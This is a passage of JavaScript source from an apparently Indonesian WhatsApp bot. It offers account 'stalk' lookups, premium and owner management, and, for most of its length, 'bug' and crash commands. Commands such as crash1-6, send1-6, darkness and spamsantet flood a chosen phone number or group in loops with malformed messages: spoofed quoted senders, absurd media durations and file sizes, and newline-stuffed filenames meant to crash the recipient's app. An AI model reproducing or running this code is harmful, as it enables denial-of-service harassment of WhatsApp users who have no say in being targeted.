reply(`*/ Stalking Freefire \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case "mlstalk": {
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Contoh ${prefix+command} 530793138|8129`)
reply("```Stalker Process```")
let dat = await stalkml(q.split("|")[0], q.split("|")[1])
reply(`*/ Stalking Mobile Legengd \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
Zoneid : ${q.split("|")[1]}`)
}
break
case "npmstalk":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Contoh ${prefix+command} Dims Bot-api`)
reply("```Stalker Process```")
eha = await stalknpm(q)
reply(`*/ Stalking Npm \\*

Nama : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case "githubstalk":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Contoh ${prefix+command} Dims Bot`)
reply("```Stalker Process```")
aj = await stalkgh(`${q}`)
sock.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Stalking Github \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case "cerpen":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
sock.sendMessage(from, sendListCerpen, { quoted : m })
}
break
case "ceritapendek":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Judul Cerita Nya Apa Om?`)
reply("```Wet Sabar Lagi Proses```")
let wpfuej = await ceritapendek(q)
reply(`⭔ _*Title :*_ ${wpfuej.title}\n⭔ _*Author :*_ ${wpfuej.author}\n⭔ _*Category :*_ ${wpfuej.kategori}\n⭔ _*Pass Moderation :*_ ${wpfuej.lolos}\n⭔ _*Story :*_\n${wpfuej.cerita}`)
}
break
case "jadibot":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (m.isGroup) return
jadibot(sock, sender)
}
break
case "listjadibot":{
if (m.isGroup) return
listjadibot(sock, m)
}
break
case "stopjadibot":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (m.isGroup) return
stopjadibot(sock, sender)
}
break
case "listpremium":
teks = '*List Premium*\n\n'
for (let meldje of prem) {
teks += `- @${meldje.split("@")[0]}\n`
}
teks += `\n*Total : ${prem.length}*`
sock.sendMessage(m.chat, { text: teks.trim(), mentions: prem, "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: prem }}, { quoted: m })
break
case "addowner":
if (!isCreator) return 
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281269024490`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await sock.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./ACTION/DATABASE/owner.json', JSON.stringify(owner))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isCreator) return 
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281269024490`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./ACTION/DATABASE/owner.json', JSON.stringify(owner))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "modesimipc":
if (!isCreator) return 
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (simi === true) return reply('Udah aktif kak')
simi = true
reply(`Mode ${command} telah aktif kak`)
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (simi === false) return reply('Udah off kak')
simi = false
reply(`Mode ${command} telah di matikan`)
} else if (!q) {
sock.sendButMessage(from,`MODE AUTO RESPON`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix + command} on`, buttonText: { displayText: `On` }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: `Off` }, type: 1 },],m)
}
break
case "addprem":{
if (!isCreator) return 
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281269024490`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await sock.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./ACTION/DATABASE/premium.json', JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isCreator) return 
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281269024490`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./ACTION/DATABASE/premium.json', JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case "addrespon":{
if (!isCreator) return 
if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
argz = arge.split('|')
if (checkCommands(argz[0], commands) === true) return reply(`Udah ada`)
addCommands(argz[0], argz[1], sender, commands)
reply(`Sukses menambahkan respon ${argz[0]}`)
}
break
case "delrespon":
if (!isCreator) return 
if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
if (!checkCommands(q, commands)) return reply(`Ga ada di database`)
deleteCommands(q, commands)
reply(`Sukses menghapus respon ${body.slice(11)}`)
break
case "addvn":{
if (!isCreator) return 
if (args.length < 1) return reply('Nama audionya apa')
if (vndb.includes(q)) return reply("Nama tersebut sudah di gunakan")
let delb = await sock.downloadAndSaveMediaMessage(quoted)
vndb.push(q)
await fsx.copy(delb, `./ACTION/DATABASE/Audio/${q}.mp3`)
fs.writeFileSync('./ACTION/DATABASE/dbvn.json', JSON.stringify(vndb))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break
case "delvn":{
if (!isCreator) return 
if (args.length < 1) return reply('Masukan query')
if (!vndb.includes(q)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vndb.indexOf(q)
vndb.splice(wanu, 1)
fs.writeFileSync('./ACTION/DATABASE/vnadd.json', JSON.stringify(vndb))
fs.unlinkSync(`./ACTION/DATABASE/Audio/${q}.mp3`)
reply(`Sukses delete vn ${q}`)
}
break
case "listvn":{
let teks = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vndb) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${vndb.length}*`
reply(teks)
}
break
case "spamsantetpc": 
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Contoh ${command} 6281297970769`)
nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
let hdhe = await sock.onWhatsApp(nmn)
if (hdhe.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
santedprivate(sendBug, nmn, sleep)
break
case "spamsantetgc": 
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let fhehfhe = args[0].split('https://chat.whatsapp.com/')[1]
let mnm = await sock.groupAcceptInvite(fhehfhe)
santedgroup(sendBug, mnm, sleep)
break
case "👻": case "💀": case "☠️": case "👽": case "👾": case "🤖": case "🎃": case "👹": case "👺": case "💐": case "🥀": case "🔥": case "🌹": case "🗿": case "🌷": case "🌺": case "🌸": case "🏵": case "️🌻": case "🤡": {
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
sendBug(from)
sock.sendMessage(from, {
text: wm, 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6281269024490`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6281269024490`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6281269024490`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6281269024490`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6281269024490`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6281269024490`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `${prefix}rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `${prefix}x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa`}}]})
}}
break
case "crash1":
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) { 
let fdoc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
documentMessage: {
title: wm, 
jpegThumbnail: thumb,
}
}
} 
sock.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:fdoc})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case "crash2":
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let foto = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": wm, 
"jpegThumbnail": thumb
} 
} 
}
sock.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:foto})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case "crash3":
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let fvoc = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
sock.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:fvoc})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case "crash4":
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let fgif = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
'title':wm,
'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': wm,
'jpegThumbnail': thumb,
}
}
}
sock.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:fgif})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case "crash5":
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let floc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: wm,
jpegThumbnail: thumb, 
}
}
}
sock.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:floc})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case "crash6":
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let ftoko = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": thumb}, 
"title": wm, 
"description": wm, 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": wm, 
"productImageCount": 1}, 
"businessOwnerJid": `6281269024490@s.whatsapp.net`}}}	
sock.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:ftoko})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case "darkness":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628362663622`)
tosend = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = "30"
let kgdhwus = await sock.onWhatsApp(tosend)
if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
for (let i = 0; i < jumlah; i++) {
sock.sendMessage(tosend, { document: thumb, fileLength:"500000000000", fileName:"Darkness 㐅\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", mimetype:"application/txt" }, { quoted : lep })
}
reply(`Sukses Send Bug Ke Nomor ${tosend} Sebanyak ${jumlah}`)
}
break
case "send1":
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628362663622`)
tosend = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = "30"
let kgdhwus = await sock.onWhatsApp(tosend)
if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
for (let i = 0; i < jumlah; i++) {
sendBug(tosend)
}
reply(`Sukses Send Bug Ke Nomor ${tosend} Sebanyak ${jumlah}`)
break
case "send2":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628362663622`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = "30"
let kgdhwus = await sock.onWhatsApp(num)
if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
for (let i = 0; i < jumlah; i++) {
sock.sendMessage(num,{text:wm},{quoted:lep})
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case "send3":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628362663622`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = "30"
let kgdhwus = await sock.onWhatsApp(num)
if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
for (let i = 0; i < jumlah; i++) {
sock.sendMessage(num, listMenuMessage, { quoted: lep })
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case "send4":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628362663622`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = "30"
let kgdhwus = await sock.onWhatsApp(num)
if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
for (let i = 0; i < jumlah; i++) {
let fgif = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
'title':wm,
'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': wm,
'jpegThumbnail': thumb,
}
}
}
sock.sendMessage(num, {text:`${wm} [CRASH]`},{quoted:fgif})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case "send5":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628362663622`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = "30"
let kgdhwus = await sock.onWhatsApp(num)
if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
for (let i = 0; i < jumlah; i++) {
let floc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: wm,
jpegThumbnail: thumb, 
}
}
}
sock.sendMessage(num, {text:`${wm} [CRASH]`},{quoted:floc})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case "send6":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628362663622`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = "30"
let kgdhwus = await sock.onWhatsApp(num)
if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
for (let i = 0; i < jumlah; i++) {
let ftoko = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": thumb}, 
"title": wm, 
"description": wm, 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": wm, 
"productImageCount": 1}, 
"businessOwnerJid": `6281269024490@s.whatsapp.net`}}}	
sock.sendMessage(num, {text:`${wm} [CRASH]`},{quoted:ftoko})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case "kirgosend":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
sock.sendMessage(m.chat,{text:wm},{quoted:lep})
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case "kirgosend1":
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) { 
let fdoc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
documentMessage: {
title: wm, 
jpegThumbnail: thumb,
}
}
} 
sock.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:fdoc})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case "kirgosend2":
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let foto = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": wm, 
"jpegThumbnail": thumb
} 
} 
}
sock.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:foto})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case "kirgosend3":
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let fvoc = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
sock.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:fvoc})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case "kirgosend4":
